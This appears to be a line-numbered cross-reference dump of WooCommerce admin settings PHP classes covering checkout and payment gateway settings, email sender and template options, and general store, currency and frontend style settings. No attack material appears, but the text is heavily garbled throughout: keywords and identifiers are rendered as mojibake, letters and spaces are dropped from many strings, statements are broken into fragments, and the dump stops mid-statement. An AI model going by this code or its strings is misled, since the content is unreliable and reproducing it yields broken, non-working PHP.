funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'checkout';

25 
$this
->
Ïb–
 = 
	`_x
( 'Checkout', 'Settingsab†abel', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_admš_f›ld_·ym’t_g©eways', 
	`¬¿y
Ğ
$this
, 'payment_gateways_setting' ) );

31 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

39 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

40 
$£ùiÚs
 = 
	`¬¿y
(

41 '' => 
	`__
( 'Checkout Options', 'woocommerce' )

45 
$·ym’t_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`·ym’t_g©eways
();

47 
	`fÜ—ch
 ( 
$·ym’t_g©eways
 
as
 
$g©eway
 ) {

49 
$t™Ë
 = 
	`em±y
Ğ
$g©eway
->
m‘hod_t™Ë
 ) ? 
	`ucfœ¡
Ğ$g©eway->
id
 ) : $gateway->method_title;

51 
$£ùiÚs
[ 
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$g©eway
 ) ) ] = 
	`esc_html
Ğ
$t™Ë
 );

54  
$£ùiÚs
;

55 
	}
}

62 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

63  
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_g©eways_£‰šgs', 
	`¬¿y
(

65 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Checkout Process', 'woocommerce' ), 'type' => 'title', 'id' => 'checkout_process_options' ),

67 
	`¬¿y
(

68 't™Ë' => 
	`__
( 'Coupons', 'woocommerce' ),

69 'desc' => 
	`__
( 'Enablehe use of coupons', 'woocommerce' ),

73 'desc_t' => 
	`__
( 'Coupons can be‡pplied fromhe cart‡nd checkout…ages.', 'woocommerce' ),

74 'autŞßd' => 
çl£


77 
	`¬¿y
(

78 't™Ë' => 
	`_x
( 'Checkout', 'Settings group†abel', 'woocommerce' ),

79 'desc' => 
	`__
( 'Enable guest checkout', 'woocommerce' ),

80 'desc_t' => 
	`__
( 'Allows customerso checkout without creating‡n‡ccount.', 'woocommerce' ),

85 'autŞßd' => 
çl£


88 
	`¬¿y
(

89 'desc' => 
	`__
( 'Force secure checkout', 'woocommerce' ),

95 'desc_t' => 
	`__
( 'Force SSL (HTTPS) onhe checkout…ages (an SSL Certificate is„equired).', 'woocommerce' ),

98 
	`¬¿y
(

99 'desc' => 
	`__
( 'Un-force HTTPS when†eavinghe checkout', 'woocommerce' ),

107 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'checkout_process_options'),

109 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Checkout Pages', 'woocommerce' ), 'desc' => __( 'These…ages‚eedo be set sohat WooCommerce knows whereo send userso checkout.', 'woocommerce' ), 'type' => 'title', 'id' => 'checkout_page_options' ),

111 
	`¬¿y
(

112 't™Ë' => 
	`__
( 'Cart Page', 'woocommerce' ),

113 'desc' => 
	`__
Ğ'PagcÚ‹Ás:', 'woocomm”û' ) . ' [' . 
	`­¶y_f‹rs
( 'woocommerce_cart_shortcode_tag', 'woocommerce_cart' ) . ']',

119 'desc_t' => 
Œue
,

122 
	`¬¿y
(

123 't™Ë' => 
	`__
( 'Checkout Page', 'woocommerce' ),

124 'desc' => 
	`__
Ğ'PagcÚ‹Ás:', 'woocomm”û' ) . ' [' . 
	`­¶y_f‹rs
( 'woocommerce_checkout_shortcode_tag', 'woocommerce_checkout' ) . ']',

130 'desc_t' => 
Œue
,

133 
	`¬¿y
(

134 't™Ë' => 
	`__
( 'Terms‡nd Conditions', 'woocommerce' ),

135 'desc' => 
	`__
( 'If you define‡ "Terms"…agehe customer will be‡sked ifhey‡ccepthem when checking out.', 'woocommerce' ),

141 'desc_t' => 
Œue
,

142 'autŞßd' => 
çl£


145 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'checkout_page_options' ),

147 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Checkout Endpoints', 'woocommerce' ), 'type' => 'title', 'desc' => __( 'Endpoints‡re‡ppendedo your…age URLso handle specific‡ctions duringhe checkout…rocess. They should be unique.', 'woocommerce' ), 'id' => 'account_endpoint_options' ),

149 
	`¬¿y
(

150 't™Ë' => 
	`__
( 'Pay', 'woocommerce' ),

151 'desc' => 
	`__
( 'Endpoint forhe Checkout &rarr; Pay…age', 'woocommerce' ),

155 'desc_t' => 
Œue
,

158 
	`¬¿y
(

159 't™Ë' => 
	`__
( 'Order Received', 'woocommerce' ),

160 'desc' => 
	`__
( 'Endpoint forhe Checkout &rarr; Order Received…age', 'woocommerce' ),

164 'desc_t' => 
Œue
,

167 
	`¬¿y
(

168 't™Ë' => 
	`__
( 'Add Payment Method', 'woocommerce' ),

169 'desc' => 
	`__
( 'Endpoint forhe Checkout &rarr; Add Payment Method…age', 'woocommerce' ),

173 'desc_t' => 
Œue
,

176 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'checkout_endpoint_options' ),

178 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Payment Gateways', 'woocommerce' ), 'desc' => __( 'Installed gateways‡re†isted below. Drag‡nd drop gatewayso controlheir display order onhe frontend.', 'woocommerce' ), 'type' => 'title', 'id' => 'payment_gateways_options' ),

180 
	`¬¿y
( 'type' => 'payment_gateways' ),

182 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'payment_gateways_options' ),

185 
	}
}

190 
public
 
funùiÚ
 
	$ouut
() {

191 
glob®
 
$cu¼’t_£ùiÚ
;

194 
$·ym’t_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`·ym’t_g©eways
();

196 iàĞ
$cu¼’t_£ùiÚ
 ) {

197 
	`fÜ—ch
 ( 
$·ym’t_g©eways
 
as
 
$g©eway
 ) {

198 iàĞ
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$g©eway
 ) ) =ğ¡¹Şow”Ğ
$cu¼’t_£ùiÚ
 ) ) {

199 
$g©eway
->
	`admš_İtiÚs
();

204 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

206 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

208 
	}
}

216 
public
 
funùiÚ
 
	$·ym’t_g©eways_£‰šg
() {

218 <
Œ
 
v®ign
="top">

219 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
	`_e
( 'Gateway Display', 'woocommerce' ) ?></th>

220 <
td
 
şass
="forminp">

221 <
bË
 
şass
="wc_g©eway wideçt" 
ûÎ¥acšg
="0">

222 <
th—d
>

223 <
Œ
>

224 <?
php


225 
$cŞumns
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_g©eways_£‰šg_cŞumns', 
	`¬¿y
(

226 'deçuÉ' => 
	`__
( 'Default', 'woocommerce' ),

227 'Çme' => 
	`__
( 'Gateway', 'woocommerce' ),

228 'id' => 
	`__
( 'Gateway ID', 'woocommerce' ),

229 '¡©us' => 
	`__
( 'Status', 'woocommerce' ),

233 
	`fÜ—ch
 ( 
$cŞumns
 
as
 
$key
 => 
$cŞumn
 ) {

234 
echo
 '<th cÏss="' . 
	`esc_©Œ
Ğ
$key
 ) . '">' . 
	`esc_html
Ğ
$cŞumn
 ) . '</th>';

237 </
Œ
>

238 </
th—d
>

239 <
tbody
>

240 <?
php


241 
$deçuÉ_g©eway
 = 
	`g‘_İtiÚ
( 'woocommerce_default_gateway' );

243 
	`fÜ—ch
 ( 
	`WC
()->
·ym’t_g©eways
->
	`·ym’t_g©eways
(è
as
 
$g©eway
 ) {

245 
echo
 '<tr>';

247 
	`fÜ—ch
 ( 
$cŞumns
 
as
 
$key
 => 
$cŞumn
 ) {

248  
$key
 ) {

250 
echo
 '<td width="1%" class="default">

251 <
šput
 
ty³
="¿dio" 
Çme
="deçuÉ_g©eway" 
v®ue
="' .ƒsc_attr( $gateway->id ) . '" ' . checked( $default_gateway,ƒsc_attr( $gateway->id ), false ) . ' />

252 <
šput
 
ty³
="hidd’" 
Çme
="g©eway_Üd”[]" 
v®ue
="' .ƒsc_attr( $gateway->id ) . '" />

253 </
td
>';

256 
echo
 '<td class="name">

258 </
td
>';

261 
echo
 '<td class="id">

263 </
td
>';

266 
echo
 '<td class="status">';

268 iàĞ
$g©eway
->
’abËd
 == 'yes' )

269 
echo
 '<¥ª cÏss="¡©us-’abËds" d©a-t="' . 
	`__
 ( 'Enabled', 'woocommerce' ) . '">' . __ ( 'Enabled', 'woocommerce' ) . '</span>';

271 
echo
 '-';

273 
echo
 '</td>';

276 
echo
 '<td class="settings">

277 <
a
 
şass
="bu‰Ú" 
h»f
="' .‡dmš_u¾Ğ'admš.php?·ge=wc-£‰šgs&b=checkout&£ùiÚ=' . sŒtŞow”Ğg‘_şassĞ$g©eway ) ) ) . '">' . __Ğ'
S‘tšgs
', '
woocomm”û
' ) . '</a>

278 </
td
>';

281 
	`do_aùiÚ
Ğ'woocomm”û_·ym’t_g©eways_£‰šg_cŞumn_' . 
$key
, 
$g©eway
 );

286 
echo
 '</tr>';

289 </
tbody
>

290 </
bË
>

291 </
td
>

292 </
Œ
>

293 <?
php


294 
	}
}

299 
public
 
funùiÚ
 
	$§ve
() {

300 
glob®
 
$cu¼’t_£ùiÚ
;

302 iàĞ! 
$cu¼’t_£ùiÚ
 ) {

304 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

306 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

307 
	`WC
()->
·ym’t_g©eways
->
	`´oûss_admš_İtiÚs
();

309 } 
	`–£if
 ( 
	`şass_exi¡s
Ğ
$cu¼’t_£ùiÚ
 ) ) {

311 
$cu¼’t_£ùiÚ_şass
 = 
Ãw
 
	`$cu¼’t_£ùiÚ
();

313 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$cu¼’t_£ùiÚ_şass
->
id
 );

315 
	`WC
()->
	`·ym’t_g©eways
()->
	`š™
();

317 
	}
}

320 
	g’dif
;

322  
Ãw
 
WC_S‘tšgs_Paym’t_G©eways
();

	@includes/admin/settings/class-wc-settings-emails.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Emails' ) ) :

18 şas 
	cWC_S‘tšgs_Emas
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'email';

25 
$this
->
Ïb–
 = 
	`__
( 'Emails', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

38 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

39 
$£ùiÚs
 = 
	`¬¿y
(

40 '' => 
	`__
( 'Email Options', 'woocommerce' )

44 
$ma”
 = 
	`WC
()->
	`ma”
();

45 
$ema_‹m¶©es
 = 
$ma”
->
	`g‘_emas
();

47 
	`fÜ—ch
 ( 
$ema_‹m¶©es
 
as
 
$ema
 ) {

48 
$t™Ë
 = 
	`em±y
Ğ
$ema
->
t™Ë
 ) ? 
	`ucfœ¡
Ğ$ema->
id
 ) : ucfirst( $email->title );

50 
$£ùiÚs
[ 
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$ema
 ) ) ] = 
	`esc_html
Ğ
$t™Ë
 );

53  
$£ùiÚs
;

54 
	}
}

61 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

62  
	`­¶y_f‹rs
('woocomm”û_ema_£‰šgs', 
	`¬¿y
(

64 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'email_recipient_options' ),

66 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Email Sender Options', 'woocommerce' ), 'type' => 'title', 'desc' => __( 'The following options‡ffecthe sender (email‡ddress‡nd‚ame) used in WooCommerceƒmails.', 'woocommerce' ), 'id' => 'email_options' ),

68 
	`¬¿y
(

69 't™Ë' => 
	`__
( '"From" Name', 'woocommerce' ),

74 'deçuÉ' => 
	`esc_©Œ
(
	`g‘_blogšfo
('title')),

75 'autŞßd' => 
çl£


78 
	`¬¿y
(

79 't™Ë' => 
	`__
( '"From" Email Address', 'woocommerce' ),

83 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

87 'deçuÉ' => 
	`g‘_İtiÚ
('admin_email'),

88 'autŞßd' => 
çl£


91 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'email_options' ),

93 
	`¬¿y
Ğ't™Ë' => 
	`__
Ğ'Ema Tem¶©e', 'woocomm”û' ), 'ty³' => 't™Ë', 'desc' => 
	`¥rštf
(__Ğ'Thi £ùiÚ†‘ you cu¡omi£hWooComm”ûƒmas. <¨h»f="%s"¬g‘="_bÏnk">Click h”tØ´ev›w you¸emaem¶©e</a>. FÜ mÜadvªûd cÚŒŞ cİy <code>woocomm”û/‹m¶©es/emas/</code>Ø<code>you¹heme/woocomm”û/emas/</code>.', 'woocomm”û' ), 
	`wp_nÚû_u¾
(
	`admš_u¾
('?preview_woocommerce_mail=true'), 'preview-mail')), 'id' => 'email_template_options' ),

95 
	`¬¿y
(

96 't™Ë' => 
	`__
( 'Header Image', 'woocommerce' ),

97 'desc' => 
	`¥rštf
(
	`__
Ğ'EÁ”‡ URLØª imagyou wªˆtØshow iÀthema\' h—d”. U¶ßd you¸imagusšgh<¨h»f="%s">medŸ u¶ßd”</a>.', 'woocomm”û' ), 
	`admš_u¾
('media-new.php')),

102 'autŞßd' => 
çl£


105 
	`¬¿y
(

106 't™Ë' => 
	`__
( 'Email Footer Text', 'woocommerce' ),

107 'desc' => 
	`__
( 'Theexto‡ppear inhe footer of WooCommerceƒmails.', 'woocommerce' ),

111 'deçuÉ' => 
	`g‘_blogšfo
('t™Ë'è. ' - ' . 
	`__
( 'Powered by WooCommerce', 'woocommerce' ),

112 'autŞßd' => 
çl£


115 
	`¬¿y
(

116 't™Ë' => 
	`__
( 'Base Colour', 'woocommerce' ),

117 'desc' => 
	`__
( 'The base colour for WooCommerceƒmailemplates. Default <code>#557da1</code>.', 'woocommerce' ),

122 'autŞßd' => 
çl£


125 
	`¬¿y
(

126 't™Ë' => 
	`__
( 'Background Colour', 'woocommerce' ),

127 'desc' => 
	`__
( 'The background colour for WooCommerceƒmailemplates. Default <code>#f5f5f5</code>.', 'woocommerce' ),

132 'autŞßd' => 
çl£


135 
	`¬¿y
(

136 't™Ë' => 
	`__
( 'Email Body Background Colour', 'woocommerce' ),

137 'desc' => 
	`__
( 'The main body background colour. Default <code>#fdfdfd</code>.', 'woocommerce' ),

142 'autŞßd' => 
çl£


145 
	`¬¿y
(

146 't™Ë' => 
	`__
( 'Email Body Text Colour', 'woocommerce' ),

147 'desc' => 
	`__
( 'The main bodyext colour. Default <code>#505050</code>.', 'woocommerce' ),

152 'autŞßd' => 
çl£


155 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'email_template_options' ),

158 
	}
}

163 
public
 
funùiÚ
 
	$ouut
() {

164 
glob®
 
$cu¼’t_£ùiÚ
;

167 
$ma”
 = 
	`WC
()->
	`ma”
();

168 
$ema_‹m¶©es
 = 
$ma”
->
	`g‘_emas
();

170 iàĞ
$cu¼’t_£ùiÚ
 ) {

171 
	`fÜ—ch
 ( 
$ema_‹m¶©es
 
as
 
$ema
 ) {

172 iàĞ
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$ema
 ) ) =ğ
$cu¼’t_£ùiÚ
 ) {

173 
$ema
->
	`admš_İtiÚs
();

178 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

180 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

182 
	}
}

187 
public
 
funùiÚ
 
	$§ve
() {

188 
glob®
 
$cu¼’t_£ùiÚ
;

190 iàĞ! 
$cu¼’t_£ùiÚ
 ) {

192 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

193 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

198 
$ma”
 = 
	`WC
()->
	`ma”
();

200 iàĞ
	`şass_exi¡s
Ğ
$cu¼’t_£ùiÚ
 ) ) {

201 
$cu¼’t_£ùiÚ_şass
 = 
Ãw
 
	`$cu¼’t_£ùiÚ
();

202 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_' . 
$this
->
id
 . '_' . 
$cu¼’t_£ùiÚ_şass
->id );

203 
	`WC
()->
	`ma”
()->
	`š™
();

205 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_' . 
$this
->
id
 . '_' . 
$cu¼’t_£ùiÚ
 );

208 
	}
}

211 
	g’dif
;

213  
Ãw
 
WC_S‘tšgs_Emas
();

	@includes/admin/settings/class-wc-settings-general.php

1 <?
php


11 iàĞ! 
defšed
( 'ABSPATH' ) ) {

12 
	gex™
;

15 iàĞ! 
şass_exi¡s
( 'WC_Settings_General' ) ) :

20 şas 
	cWC_S‘tšgs_G’”®
 
ex‹nds
 
WC_S‘tšgs_Page
 {

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

26 
$this
->
id
 = 'general';

27 
$this
->
Ïb–
 = 
	`__
( 'General', 'woocommerce' );

29 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

30 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

31 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

33 iàĞĞ
$¡yËs
 = 
WC_FrÚ‹nd_Süts
::
	`g‘_¡yËs
(èè&& 
	`¬¿y_key_exi¡s
( 'woocommerce-general', $styles ) ) {

34 
	`add_aùiÚ
Ğ'woocomm”û_admš_f›ld_äÚ‹nd_¡yËs', 
	`¬¿y
Ğ
$this
, 'frontend_styles_setting' ) );

43 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

44 
$cu¼’cy_code_İtiÚs
 = 
	`g‘_woocomm”û_cu¼’c›s
();

46 
	`fÜ—ch
 ( 
$cu¼’cy_code_İtiÚs
 
as
 
$code
 => 
$Çme
 ) {

47 
$cu¼’cy_code_İtiÚs
[ 
$code
 ] = 
$Çme
 . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
( $code ) . ')';

50  
	`­¶y_f‹rs
Ğ'woocomm”û_g’”®_£‰šgs', 
	`¬¿y
(

52 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'General Options', 'woocommerce' ), 'type' => 'title', 'desc' => '', 'id' => 'general_options' ),

54 
	`¬¿y
(

55 't™Ë' => 
	`__
( 'Base Location', 'woocommerce' ),

56 'desc' => 
	`__
( 'This ishe base†ocation for your business. Tax„ates will be based onhis country.', 'woocommerce' ),

61 'desc_t' => 
Œue
,

64 
	`¬¿y
(

65 't™Ë' => 
	`__
( 'Selling Location(s)', 'woocommerce' ),

66 'desc' => 
	`__
( 'This option†ets you†imit which countries you‡re willingo sello.', 'woocommerce' ),

72 'desc_t' => 
Œue
,

73 'İtiÚs' => 
	`¬¿y
(

74 '®l' => 
	`__
( 'Sello‡ll countries', 'woocommerce' ),

75 '¥ecific' => 
	`__
( 'Sello specific countries only', 'woocommerce' )

79 
	`¬¿y
(

80 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

88 
	`¬¿y
(

89 't™Ë' => 
	`__
( 'Store Notice', 'woocommerce' ),

90 'desc' => 
	`__
( 'Enable site-wide store‚oticeext', 'woocommerce' ),

96 
	`¬¿y
(

97 't™Ë' => 
	`__
( 'Store Notice Text', 'woocommerce' ),

100 'deçuÉ' => 
	`__
( 'This is‡ demo store foresting…urposes &mdash;‚o orders shall be fulfilled.', 'woocommerce' ),

103 'autŞßd' => 
çl£


106 
	`¬¿y
(

107 't™Ë' => 
	`__
( 'API', 'woocommerce' ),

108 'desc' => 
	`__
( 'Enablehe REST API', 'woocommerce' ),

114 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'general_options'),

116 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Currency Options', 'woocommerce' ), 'type' => 'title', 'desc' => __( 'The following options‡ffect how…rices‡re displayed onhe frontend.', 'woocommerce' ), 'id' => 'pricing_options' ),

118 
	`¬¿y
(

119 't™Ë' => 
	`__
( 'Currency', 'woocommerce' ),

120 'desc' => 
	`__
( 'This controls what currency…rices‡re†isted‡t inhe catalog‡nd which currency gateways willake…ayments in.', 'woocommerce' ),

126 'desc_t' => 
Œue
,

127 'İtiÚs' => 
$cu¼’cy_code_İtiÚs


130 
	`¬¿y
(

131 't™Ë' => 
	`__
( 'Currency Position', 'woocommerce' ),

132 'desc' => 
	`__
( 'This controlshe…osition ofhe currency symbol.', 'woocommerce' ),

138 'İtiÚs' => 
	`¬¿y
(

139 'Ëá' => 
	`__
Ğ'Leá', 'woocomm”û' ) . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . '99.99)',

140 'right' => 
	`__
Ğ'Right', 'woocomm”û' ) . ' (99.99' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . ')',

141 'Ëá_¥aû' => 
	`__
Ğ'Leá w™h s·û', 'woocomm”û' ) . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . ' 99.99)',

142 'right_¥aû' => 
	`__
Ğ'Righˆw™h s·û', 'woocomm”û' ) . ' (99.99 ' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . ')'

144 'desc_t' => 
Œue
,

147 
	`¬¿y
(

148 't™Ë' => 
	`__
( 'Thousand Separator', 'woocommerce' ),

149 'desc' => 
	`__
( 'This setshehousand separator of displayed…rices.', 'woocommerce' ),

154 'desc_t' => 
Œue
,

157 
	`¬¿y
(

158 't™Ë' => 
	`__
( 'Decimal Separator', 'woocommerce' ),

159 'desc' => 
	`__
( 'This setshe decimal separator of displayed…rices.', 'woocommerce' ),

164 'desc_t' => 
Œue
,

167 
	`¬¿y
(

168 't™Ë' => 
	`__
( 'Number of Decimals', 'woocommerce' ),

169 'desc' => 
	`__
( 'This setshe‚umber of decimal…oints shown in displayed…rices.', 'woocommerce' ),

173 'desc_t' => 
Œue
,

175 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

181 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'pricing_options' ),

183 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Styles‡nd Scripts', 'woocommerce' ), 'type' => 'title', 'id' => 'script_styling_options' ),

185 
	`¬¿y
( 'type' => 'frontend_styles' ),

187 
	`¬¿y
(

188 't™Ë' => 
	`__
( 'Scripts', 'woocommerce' ),

189 'desc' => 
	`__
( 'Enable Lightbox', 'woocommerce' ),

192 'desc_t' => 
	`__
( 'Include WooCommerce\'s†ightbox. Product gallery images will open in‡†ightbox.', 'woocommerce' ),

197 
	`¬¿y
(

198 'desc' => 
	`__
( 'Enableƒnhanced country select boxes', 'woocommerce' ),

203 'desc_t' => 
	`__
( 'This willƒnable‡ script‡llowinghe country fieldso be searchable.', 'woocommerce' ),

204 'autŞßd' => 
çl£


207 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'script_styling_options' ),

210 
	}
}

218 
public
 
funùiÚ
 
	$äÚ‹nd_¡yËs_£‰šg
() {

219 ?><
Œ
 
v®ign
="tİ" 
şass
="woocommerce_frontend_css_colors">

220 <
th
 
scİe
="row" 
şass
="titledesc">

221 <?
php
 
	`_e
( 'Frontend Styles', 'woocommerce' ); ?>

222 </
th
>

223 <
td
 
şass
="fÜmšp"><?
php


225 
$ba£_fe
 = 
	`WC
()->
	`¶ugš_·th
() . '/assets/css/woocommerce-base.less';

226 
$css_fe
 = 
	`WC
()->
	`¶ugš_·th
() . '/assets/css/woocommerce.css';

228 iàĞ
	`is_wr™abË
Ğ
$ba£_fe
 ) && is_wr™abËĞ
$css_fe
 ) ) {

231 
$cŞÜs
 = 
	`¬¿y_m­
Ğ'esc_©Œ', (
¬¿y
è
	`g‘_İtiÚ
( 'woocommerce_frontend_css_colors' ) );

234 iàĞ
	`em±y
Ğ
$cŞÜs
['primary'] ) ) {

235 
$cŞÜs
['primary'] = '#ad74a2';

237 iàĞ
	`em±y
Ğ
$cŞÜs
['secondary'] ) ) {

238 
$cŞÜs
['secondary'] = '#f7f6f7';

240 iàĞ
	`em±y
Ğ
$cŞÜs
['highlight'] ) ) {

241 
$cŞÜs
['highlight'] = '#85ad74';

243 iàĞ
	`em±y
Ğ
$cŞÜs
['content_bg'] ) ) {

244 
$cŞÜs
['content_bg'] = '#ffffff';

246 iàĞ
	`em±y
Ğ
$cŞÜs
['subtext'] ) ) {

247 
$cŞÜs
['subtext'] = '#777777';

251 
$this
->
	`cŞÜ_pick”
Ğ
	`__
Ğ'Prim¬y', 'woocomm”û' ), 'woocomm”û_äÚ‹nd_css_´im¬y', 
$cŞÜs
['primary'], __( 'Callo‡ction buttons/price slider/layered‚av UI', 'woocommerce' ) );

252 
$this
->
	`cŞÜ_pick”
Ğ
	`__
Ğ'SecÚd¬y', 'woocomm”û' ), 'woocomm”û_äÚ‹nd_css_£cÚd¬y', 
$cŞÜs
['secondary'], __( 'Buttons‡ndabs', 'woocommerce' ) );

253 
$this
->
	`cŞÜ_pick”
Ğ
	`__
Ğ'Highlight', 'woocomm”û' ), 'woocomm”û_äÚ‹nd_css_highlight', 
$cŞÜs
['highlight'], __( 'Price†abels‡nd Sale Flashes', 'woocommerce' ) );

254 
$this
->
	`cŞÜ_pick”
Ğ
	`__
Ğ'CÚ‹Á', 'woocomm”û' ), 'woocomm”û_äÚ‹nd_css_cÚ‹Á_bg', 
$cŞÜs
['content_bg'], __( 'Yourhemes…age background - used forab‡ctive states', 'woocommerce' ) );

255 
$this
->
	`cŞÜ_pick”
Ğ
	`__
Ğ'Sub‹xt', 'woocomm”û' ), 'woocomm”û_äÚ‹nd_css_sub‹xt', 
$cŞÜs
['subtext'], __( 'Used for certainext‡nd‡sides - breadcrumbs, smallextƒtc.', 'woocommerce' ) );

258 
echo
 '<¥ª cÏss="desütiÚ">' . 
	`__
( 'Toƒdit colours <code>woocommerce/assets/css/woocommerce-base.less</code>‡nd <code>woocommerce.css</code>‚eedo be writable. See <a href="http://codex.wordpress.org/Changing_File_Permissions">the Codex</a> for more information.', 'woocommerce' ) . '</span>';

261 ?></
td
>

262 </
Œ
><?
php


263 
	}
}

275 
funùiÚ
 
cŞÜ_pick”
Ğ
$Çme
, 
$id
, 
$v®ue
, 
$desc
 = '' ) {

276 
echo
 '<div cÏss="cŞÜ_box"><¡rÚg><img cÏss="h–p_t" d©a-t="' . 
esc_©Œ
Ğ
$desc
 ) . '" src="' . 
WC
()->
¶ugš_u¾
(è. '/as£ts/images/h–p.²g" height="16" width="16" /> ' . 
esc_html
Ğ
$Çme
 ) . '</strong>

277 <
šput
 
Çme
="' .ƒsc_©ŒĞ$id ). '" 
id
="' .ƒsc_©ŒĞ$id ) . '" 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$v®uè. '" 
şass
="cŞÜpick" /> <
div
 id="colorPickerDiv_' .ƒsc_attr( $id ) . '" class="colorpickdiv"></div>

278 </
div
>';

284 
public
 
funùiÚ
 
	$§ve
() {

285 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

287 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

289 iàĞ
	`is£t
Ğ
$_POST
['woocommerce_frontend_css_primary'] ) ) {

292 
$´im¬y
 = ( ! 
	`em±y
Ğ
$_POST
['woocomm”û_äÚ‹nd_css_´im¬y'] ) ) ? 
	`wc_fÜm©_hex
( $_POST['woocommerce_frontend_css_primary'] ) : '';

293 
$£cÚd¬y
 = ( ! 
	`em±y
Ğ
$_POST
['woocomm”û_äÚ‹nd_css_£cÚd¬y'] ) ) ? 
	`wc_fÜm©_hex
( $_POST['woocommerce_frontend_css_secondary'] ) : '';

294 
$highlight
 = ( ! 
	`em±y
Ğ
$_POST
['woocomm”û_äÚ‹nd_css_highlight'] ) ) ? 
	`wc_fÜm©_hex
( $_POST['woocommerce_frontend_css_highlight'] ) : '';

295 
$cÚ‹Á_bg
 = ( ! 
	`em±y
Ğ
$_POST
['woocomm”û_äÚ‹nd_css_cÚ‹Á_bg'] ) ) ? 
	`wc_fÜm©_hex
( $_POST['woocommerce_frontend_css_content_bg'] ) : '';

296 
$sub‹xt
 = ( ! 
	`em±y
Ğ
$_POST
['woocomm”û_äÚ‹nd_css_sub‹xt'] ) ) ? 
	`wc_fÜm©_hex
( $_POST['woocommerce_frontend_css_subtext'] ) : '';

298 
$cŞÜs
 = 
	`¬¿y
